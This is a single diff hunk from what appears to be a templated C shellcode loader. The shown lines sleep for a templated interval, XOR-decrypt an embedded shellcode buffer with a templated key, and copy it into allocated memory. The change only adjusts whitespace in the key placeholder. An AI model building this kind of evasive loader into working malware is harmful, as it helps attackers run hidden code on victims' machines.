@@ -133,7 +133,7 @@ int main( int argc, char *argv[] ) {
     w.Sleep( ${ SLEEP } );
 
     /* Decrypt shellcode */
-    xorShellcode( shellcode, shellcode_size, "${KEY}" );
+    xorShellcode( shellcode, shellcode_size, "${ KEY }" );
 
     /* Copy shellcode into allocated memory */
     memcpy( mem, shellcode, shellcode_size );
